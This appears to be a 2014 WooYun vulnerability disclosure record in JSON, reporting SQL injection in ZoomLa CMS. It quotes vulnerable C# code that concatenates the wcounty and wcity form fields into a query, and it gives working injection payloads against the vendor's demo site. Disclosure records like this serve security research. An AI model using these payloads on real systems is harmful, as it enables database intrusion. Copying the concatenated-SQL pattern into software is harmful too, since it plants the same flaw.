{"id": 52454, "wybug_id": "wooyun-2014-071168", "wybug_title": "逐浪cms sql注入 一个文件 多个参数", "wybug_corp": "逐浪CMS", "wybug_author": "路人甲", "wybug_date": "2014-08-09 19:41", "wybug_open_date": "2014-11-04 19:42", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-14：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-10-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-04：\t细节向公众公开  简要描述： 逐浪cms最新版sql注入 详细说明：  逐浪最新版 sql注入可以注册普通用户 访问\nhttp://demo.zoomla.cn/User/Register.aspx\n 随便注册一个用户test1234 密码123456访问\nhttp://demo.zoomla.cn/User/Login.aspx?ReturnUrl=\n登录访问\nhttp://demo.zoomla.cn/User/UserFriend/FriendSearch/Friend_quickSYResult.aspx\n源码如下\nprotected void Page_Load(object sender, EventArgs e){    if (!base.IsPostBack)    {        string str = base.Request.Form[\"sex\"];        string str2 = base.Request.Form[\"age1\"];        string str3 = base.Request.Form[\"age2\"];        string str4 = base.Request.Form[\"wcounty\"]; //没处理        string str5 = base.Request.Form[\"wcity\"];   //没处理        string wherex = \"\";        if (!string.IsNullOrEmpty(str))        {            if (str == \"女生\")            {                wherex = wherex + \" and UserSex=0\";            }            else if (str == \"男生\")            {                wherex = wherex + \" and UserSex=1\";            }        }        if (!string.IsNullOrEmpty(str2))        {            string str7 = DateTime.Now.AddYears(-Convert.ToInt32(str2)).ToShortDateString();            wherex = wherex + \" and BirthDay<='\" + str7 + \"'\";        }        if (!string.IsNullOrEmpty(str3))        {            string str8 = DateTime.Now.AddYears(-Convert.ToInt32(str3)).ToShortDateString();            wherex = wherex + \" and BirthDay>='\" + str8 + \"'\";        }        if (!string.IsNullOrEmpty(str4))        {            wherex = wherex + \" and workProvince='\" + str4 + \"'\";  //存在注入            if (!string.IsNullOrEmpty(str5))            {                wherex = wherex + \" and workCity='\" + str5 + \"'\";  //存在注入            }        }        this.ViewState[\"wherex\"] = wherex;        if (!this.buser.CheckLogin())        {            if (SiteConfig.UserConfig.EnableCheckCodeOfLogin)            {                this.PhValCode.Visible = true;            }            else            {                this.PhValCode.Visible = false;            }            this.dwindow.Style[\"display\"] = \"\";        }        else        {            DataTable dt = new DataTable();            dt = UserTableBLL.GetUsersInfo(wherex);            this.Bind(dt);        }    }}\n访问\nhttp://demo.zoomla.cn/User\\UserFriend\\FriendSearch/Friend_quickSYResult.aspx\n提交\nsex=%E7%94%B7%E7%94%9F&age1=&age2=&wcounty=16&wcity=16%3A01' AND (SELECT @@VERSION)>0 --\n\n\n提交\nsex=%E7%94%B7%E7%94%9F&age1=&age2=&wcounty=16&wcity=16%3A01' AND (SELECT db_name())>0 --\n\n\n   漏洞证明：  漏洞证明如上   修复方案：  对参数进行处理吧   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-11-04 19:42 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}